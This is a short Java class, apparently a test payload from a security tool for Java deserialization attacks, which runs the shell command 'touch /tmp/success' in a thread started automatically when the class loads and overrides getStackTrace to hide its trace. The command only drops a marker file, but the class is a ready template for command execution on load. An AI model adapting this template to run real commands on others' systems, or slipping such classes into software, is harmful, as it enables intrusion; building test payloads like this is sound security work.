package com.reajason.javaweb.packer.deserialize.java;

/**
 * @author ReaJason
 * @since 2026/1/4
 */
public class EvilClass extends Thread implements Runnable {

    static {
        new EvilClass().start();
    }

    @Override
    public StackTraceElement[] getStackTrace() {
        return new StackTraceElement[0];
    }

    @Override
    public void run() {
        try {
            Runtime.getRuntime().exec("touch /tmp/success");
        } catch (Exception ignored) {
        }
    }
}
